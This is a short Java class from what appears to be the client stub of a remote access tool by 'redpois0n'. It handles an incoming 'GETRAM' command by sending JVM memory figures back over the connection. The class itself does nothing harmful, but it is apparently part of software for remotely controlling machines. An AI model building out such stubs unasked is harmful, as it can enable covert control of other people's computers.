package com.redpois0n.stub.packets.incoming;

import com.redpois0n.Connection;
import com.redpois0n.stub.packets.outgoing.Packet24JVMMemory;

public class PacketGETRAM extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Connection.addToSendQueue(new Packet24JVMMemory());
	}

}
